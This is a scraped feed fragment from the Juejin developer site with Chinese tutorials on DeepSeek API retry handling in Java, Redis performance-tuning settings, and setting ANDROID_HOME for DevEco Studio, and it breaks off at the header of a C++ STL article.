                <span class="hljs-type">String</span> <span class="hljs-variable">errorMsg</span> <span class="hljs-operator">=</span> DeepSeekErrorHandler.getErrorMsg(e);
                System.err.println(<span class="hljs-string">"第"</span> + retryCount + <span class="hljs-string">"次调用失败："</span> + errorMsg);

                <span class="hljs-comment">// 不该重试就直接退出</span>
                <span class="hljs-keyword">if</span> (!DeepSeekErrorHandler.needRetry(e)) {
                    <span class="hljs-keyword">break</span>;
                }

                <span class="hljs-comment">// 指数退避重试：第1次等2秒，第2次等4秒，第3次等8秒</span>
                <span class="hljs-keyword">try</span> {
                    Thread.sleep((<span class="hljs-type">long</span>) (Math.pow(<span class="hljs-number">2</span>, retryCount) * <span class="hljs-number">1000</span>));
                } <span class="hljs-keyword">catch</span> (InterruptedException ie) {
                    Thread.currentThread().interrupt();
                    <span class="hljs-keyword">break</span>;
                }
            }
        }
        <span class="hljs-keyword">return</span> <span class="hljs-string">"{\"choices\":[{\"message\":{\"content\":\"试了好几次都不行，稍后再试吧~\"}}]}"</span>;
    }
}
</code></pre>
<h2 data-id="heading-34">九、总结与最佳实践</h2>
<p>本文拆解了 Java 调用 DeepSeek API 的 8 个高频错误，从 Token 管理、并发安全、超长文本处理到跨模型适配，核心避坑思路可总结为：</p>
<h3 data-id="heading-35">1. 鉴权层：主动防御 + 被动兜底</h3>
<ul>
<li>避免硬编码 Token，对接配置中心实现动态刷新；</li>
<li>结合主动刷新（提前检测有效期）和被动刷新（捕获 401 异常），保证 Token 有效性；</li>
<li>增加降级策略，Token 刷新失败时临时延长有效期，避免服务中断。</li>
</ul>
<h3 data-id="heading-36">2. 并发层：隔离 + 安全</h3>
<ul>
<li>配置 HTTP 连接池，限制最大连接数，避免端口耗尽；</li>
<li>使用专用线程池隔离 API 调用，合理设置核心线程数、队列大小和拒绝策略；</li>
<li>每个请求独立创建非线程安全对象（如 HttpHeaders、HashMap），杜绝数据错乱。</li>
</ul>
<h3 data-id="heading-37">3. 文本层：精准计算 + 语义分块</h3>
<ul>
<li>使用专业 Token 计算库，避免按字符数分割导致的误差；</li>
<li>优先按句子分块，保留语义完整性，极端情况按 Token 切割；</li>
<li>分块调用时添加上下文标识，提升回复质量，最后拼接结果。</li>
</ul>
<h3 data-id="heading-38">4. 适配层：兼容差异 + 动态调整</h3>
<ul>
<li>按模型类型适配超时时间、请求参数，过滤不支持的参数；</li>
<li>适配错误码处理逻辑，针对不同错误码制定差异化重试策略；</li>
<li>解析响应时兼容字段差异，避免解析异常。</li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Redis性能提升50%的7个关键配置：从慢查询优化到内存碎片整理实战指南]]></title>    <link>https://juejin.cn/post/7581423932613820456</link>    <guid>https://juejin.cn/post/7581423932613820456</guid>    <pubDate>2025-12-09T04:16:52.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581423932613820456" data-draft-id="7581423932613804072" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Redis性能提升50%的7个关键配置：从慢查询优化到内存碎片整理实战指南"/> <meta itemprop="keywords" content="后端,前端,人工智能"/> <meta itemprop="datePublished" content="2025-12-09T04:16:52.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="阿橙的百宝箱"/> <meta itemprop="url" content="https://juejin.cn/user/1638743356481367"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Redis性能提升50%的7个关键配置：从慢查询优化到内存碎片整理实战指南
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1638743356481367/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    阿橙的百宝箱
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-09T04:16:52.000Z" title="Tue Dec 09 2025 04:16:52 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读1分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0"><strong>Redis性能提升50%的7个关键配置：从慢查询优化到内存碎片整理实战指南</strong></h2>
<h2 data-id="heading-1">引言</h2>
<p>Redis作为高性能的内存数据库，广泛应用于缓存、消息队列、实时统计等场景。然而，随着业务规模的增长，Redis的性能瓶颈可能逐渐显现。通过合理的配置和优化，可以显著提升Redis的性能表现。本文将深入探讨7个关键配置优化点，涵盖慢查询优化、内存管理、网络调优等方面，帮助你将Redis性能提升50%甚至更高。</p>
<h2 data-id="heading-2">主体</h2>
<h3 data-id="heading-3">1. 慢查询分析与优化</h3>
<p>慢查询是Redis性能的“隐形杀手”。默认情况下，Redis会记录执行时间超过10毫秒的命令（可通过<code>slowlog-log-slower-than</code>调整）。优化建议：</p>
<ul>
<li><strong>动态调整阈值</strong>：根据业务特点设置合理的慢查询阈值（例如调整为5ms）。</li>
<li><strong>定期分析慢日志</strong>：使用<code>SLOWLOG GET</code>命令获取慢查询记录，重点关注高频命令（如<code>KEYS *</code>、复杂Lua脚本）。</li>
<li><strong>替换低效命令</strong>：例如用<code>SCAN</code>替代<code>KEYS *</code>，避免阻塞其他请求。</li>
</ul>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 配置示例</span>
config <span class="hljs-built_in">set</span> slowlog-log-slower-than 5000  <span class="hljs-comment"># 5毫秒</span>
config <span class="hljs-built_in">set</span> slowlog-max-len 1000          <span class="hljs-comment"># 保留1000条记录</span>
</code></pre>
<h3 data-id="heading-4">2. 内存分配策略与碎片整理</h3>
<p>Redis的内存碎片问题会降低内存利用率并增加延迟。关键配置：</p>
<ul>
<li><strong>启用主动碎片整理</strong>：通过<code>activedefrag yes</code>开启（需Redis 4.0+），并调整触发阈值：
<pre><code class="hljs language-bash" lang="bash">config <span class="hljs-built_in">set</span> activedefrag <span class="hljs-built_in">yes</span>
config <span class="hljs-built_in">set</span> active-defrag-ignore-bytes 100mb     <span class="hljs-comment"># 碎片超过100MB时触发</span>
config <span class="hljs-built_in">set</span> active-defrag-threshold-lower 10     <span class="hljs-comment"># 碎片占比10%开始整理</span>
</code></pre>
</li>
<li><strong>选择合适的内存分配器</strong>：默认使用jemalloc，可通过<code>INFO memory</code>验证。对于高并发场景，可尝试调整jemalloc的参数（如<code>MALLOC_CONF=lg_dirty_mult:3</code>）。</li>
</ul>
<h3 data-id="heading-5">3. AOF持久化优化</h3>
<p>AOF日志虽能保证数据安全，但可能成为性能瓶颈。优化方向：</p>
<ul>
<li><strong>调整fsync策略</strong>：从默认的<code>everysec</code>改为<code>no</code>（牺牲部分安全性换取性能）或使用操作系统缓存（Linux默认30秒刷盘）。</li>
<li><strong>启用AOF重写压缩</strong>：通过<code>auto-aof-rewrite-percentage</code>和<code>auto-aof-rewrite-min-size</code>控制重写频率。</li>
<li><strong>混合持久化（RDB+AOF）</strong>：Redis 4.0+支持，结合两者优势：
<pre><code class="hljs language-bash" lang="bash">aof-use-rdb-preamble <span class="hljs-built_in">yes</span>
</code></pre>
</li>
</ul>
<h3 data-id="heading-6">4. TCP网络参数调优</h3>
<p>Redis的网络性能直接影响吞吐量。关键配置：</p>
<ul>
<li><strong>调整TCP backlog</strong>：默认值511可能不足，建议根据连接数调整（需同时修改OS的<code>somaxconn</code>）：
<pre><code class="hljs language-bash" lang="bash">config <span class="hljs-built_in">set</span> tcp-backlog 2048
</code></pre>
</li>
<li><strong>启用TCP快速打开（TFO）</strong>：减少连接建立延迟（需内核支持）：
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">'net.ipv4.tcp_fastopen = 3'</span> &gt;&gt; /etc/sysctl.conf
</code></pre>
</li>
</ul>
<h3 data-id="heading-7">5. Key淘汰策略与LRU算法优化</h3>
<p>当内存不足时，淘汰策略直接影响性能。推荐做法：</p>
<ul>
<li><strong>选择高效策略</strong>：优先使用<code>volatile-lru</code>或<code>allkeys-lru</code>而非随机淘汰。</li>
<li><strong>调整LRU采样精度</strong>：通过<code>maxmemory-samples</code>控制（默认5），增加采样数可提高准确性但消耗更多CPU。</li>
</ul>
<pre><code class="hljs language-bash" lang="bash">config <span class="hljs-built_in">set</span> maxmemory-policy allkeys-lru
config <span class="hljs-built_in">set</span> maxmemory-samples 10
</code></pre>
<h3 data-id="heading-8">6. Pipeline与批量操作</h3>
<p>减少网络往返次数是提升吞吐量的核心方法之一。实践建议：</p>
<ul>
<li><strong>Pipeline批处理</strong>：将多个命令合并为一次请求（注意单次Pipeline不宜过大）。示例代码（Python）：</li>
</ul>
<pre><code class="hljs language-python" lang="python">pipe = r.pipeline()
<span class="hljs-keyword">for</span> key <span class="hljs-keyword">in</span> keys:
    pipe.get(key)
results = pipe.execute()
</code></pre>
<ul>
<li><strong>大Key拆分</strong>：避免单个Value过大（如超过1MB），可改用Hash分片存储。</li>
</ul>
<h3 data-id="heading-9">7.  客户端连接池与多线程优化</h3>
<p>高并发场景下连接管理至关重要：</p>
<ul>
<li>合理设置连接池大小 （如Java的JedisPool） ，避免频繁创建销毁连接。</li>
<li>Redis  6 .0 +的多线程I/O ：通过io-threads启用多线程处理网络请求 （不涉及命令执行） ：</li>
</ul>
<pre><code class="hljs language-bash" lang="bash">io-threads  4              <span class="hljs-comment">#  建议为CPU核数的70%左右 </span>
io-threads-do-reads <span class="hljs-built_in">yes</span>    <span class="hljs-comment">#  启用读多线程 </span>
</code></pre>
<h2 data-id="heading-10">总结</h2>
<p>通过以上7个关键维度的优化 ——从慢查询分析 、内存碎片整理到网络参数调优 ——可以显著提升Redis的性能表现 。实际部署时需结合监控工具 （如Redis自带的INFO命令 、Prometheus + Grafana ）持续观察效果 ，并根据业务特点灵活调整参数 。记住 ，没有放之四海而皆准的最优配置 ，只有最适合当前场景的权衡取舍 。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ANDROID_HOME not set. Set the environment variable. Then, close DevEco Studio an]]></title>    <link>https://juejin.cn/post/7581619505585029171</link>    <guid>https://juejin.cn/post/7581619505585029171</guid>    <pubDate>2025-12-09T04:45:24.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581619505585029171" data-draft-id="7581363652781260810" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ANDROID_HOME not set. Set the environment variable. Then, close DevEco Studio an"/> <meta itemprop="keywords" content="HarmonyOS"/> <meta itemprop="datePublished" content="2025-12-09T04:45:24.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="90后晨仔"/> <meta itemprop="url" content="https://juejin.cn/user/2717648476705773"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ANDROID_HOME not set. Set the environment variable. Then, close DevEco Studio an
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2717648476705773/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    90后晨仔
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-09T04:45:24.000Z" title="Tue Dec 09 2025 04:45:24 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    1
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读1分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>这个错误提示说明你的系统环境变量中没有设置 <code>ANDROID_HOME</code>，而 DevEco Studio（华为的集成开发环境）在构建或运行项目时需要它来定位 Android SDK 的路径。</p>
<p>以下是设置 <code>ANDROID_HOME</code> 环境变量的方法，根据你的操作系统不同略有差异：</p>
<hr/>
<h3 data-id="heading-0">✅ <strong>Windows 系统</strong></h3>
<ol>
<li>
<p><strong>找到你的 Android SDK 路径</strong><br/>
通常位于：</p>
<pre><code class="hljs language-makefile" lang="makefile"><span class="hljs-section">C:\Users&lt;你的用户名&gt;\AppData\Local\Android\Sdk</span>
</code></pre>
<p>或者如果你是通过 DevEco 安装的，可能在：</p>
<pre><code class="hljs language-makefile" lang="makefile"><span class="hljs-section">C:\Users&lt;你的用户名&gt;\AppData\Roaming\Huawei\DevEco Studio\sdk</span>
</code></pre>
</li>
<li>
<p><strong>设置环境变量</strong></p>
<ul>
<li>
<p>右键“此电脑” → “属性” → “高级系统设置” → “环境变量”</p>
</li>
<li>
<p>在“系统变量”区域，点击“新建”</p>
<ul>
<li>变量名：<code>ANDROID_HOME</code></li>
<li>变量值：你的 Android SDK 路径（例如 <code>C:\Users\YourName\AppData\Local\Android\Sdk</code>）</li>
</ul>
</li>
<li>
<p>同时确保 <code>Path</code> 环境变量中包含：</p>
<pre><code class="hljs language-perl" lang="perl">%ANDROID_HOME%\tools
%ANDROID_HOME%\platform-tools
</code></pre>
</li>
</ul>
</li>
<li>
<p><strong>重启 DevEco Studio</strong><br/>
关闭后重新打开，让环境变量生效。</p>
</li>
</ol>
<hr/>
<h3 data-id="heading-1">✅ <strong>macOS / Linux</strong></h3>
<ol>
<li>
<p><strong>找到 Android SDK 路径</strong><br/>
常见路径如：</p>
<pre><code class="hljs language-javascript" lang="javascript">~<span class="hljs-regexp">/Library/</span><span class="hljs-title class_">Android</span>/sdk          # macOS 默认
~<span class="hljs-regexp">/Android/</span><span class="hljs-title class_">Sdk</span>                  # <span class="hljs-title class_">Linux</span> 或自定义
~<span class="hljs-regexp">/.huawei/</span>devcloud/sdk         # 华为 <span class="hljs-title class_">DevEco</span> 可能使用的位置
</code></pre>
</li>
<li>
<p><strong>编辑 shell 配置文件</strong><br/>
根据你使用的 shell（bash/zsh），编辑对应配置文件：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 如果是 zsh（macOS Catalina 及以后默认）</span>
nano ~/.zshrc

<span class="hljs-comment"># 如果是 bash</span>
nano ~/.bashrc
</code></pre>
</li>
<li>
<p><strong>添加以下内容</strong>（替换为你的实际路径）：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-built_in">export</span> ANDROID_HOME=<span class="hljs-variable">$HOME</span>/Library/Android/sdk
<span class="hljs-built_in">export</span> PATH=<span class="hljs-variable">$PATH</span>:<span class="hljs-variable">$ANDROID_HOME</span>/tools:<span class="hljs-variable">$ANDROID_HOME</span>/platform-tools
</code></pre>
</li>
<li>
<p><strong>使配置生效</strong>：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-built_in">source</span> ~/.zshrc    <span class="hljs-comment"># 或 source ~/.bashrc</span>
</code></pre>
</li>
<li>
<p><strong>关闭并重新打开 DevEco Studio</strong></p>
</li>
</ol>
<hr/>
<h3 data-id="heading-2">🔍 验证是否设置成功</h3>
<p>在终端（命令行）中执行：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-built_in">echo</span> <span class="hljs-variable">$ANDROID_HOME</span>
</code></pre>
<p>应输出你设置的 SDK 路径。</p>
<hr/></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[学而时习之：C++中的标准模板库7]]></title>    <link>https://juejin.cn/post/7581381365493809206</link>    <guid>https://juejin.cn/post/7581381365493809206</guid>    <pubDate>2025-12-09T03:02:58.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581381365493809206" data-draft-id="7581381365493547062" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="学而时习之：C++中的标准模板库7"/> <meta itemprop="keywords" content="C++"/> <meta itemprop="datePublished" content="2025-12-09T03:02:58.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="煤球王子"/> <meta itemprop="url" content="https://juejin.cn/user/4088439235949739"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            学而时习之：C++中的标准模板库7
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4088439235949739/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    煤球王子
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-09T03:02:58.000Z" title="Tue Dec 09 2025 03:02:58 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
